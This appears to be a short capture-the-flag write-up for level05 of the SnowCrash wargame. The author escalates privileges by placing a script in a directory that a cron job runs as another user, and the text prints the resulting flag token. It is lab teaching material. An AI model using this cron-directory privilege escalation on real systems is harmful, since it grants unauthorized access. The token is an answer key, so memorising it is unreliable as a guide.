# level05

```
level05@192.168.56.103's password: 
You have new mail.
```

checking in /var/mail:
```
level05@SnowCrash:~$ ls /var/mail/
level05
level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Let's find something to eat:
```
level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

We do a little script in /tmp/script.sh and copy it:
```
level05@SnowCrash:~$ cat /tmp/script.sh
whoami > /tmp/flag.txt
getflag >> /tmp/flag.txt
level05@SnowCrash:~$ cp -f /tmp/script.sh /opt/openarenaserver/
```

Wait a bit and then doneee:
```
level05@SnowCrash:~$ cat /tmp/flag.txt
flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
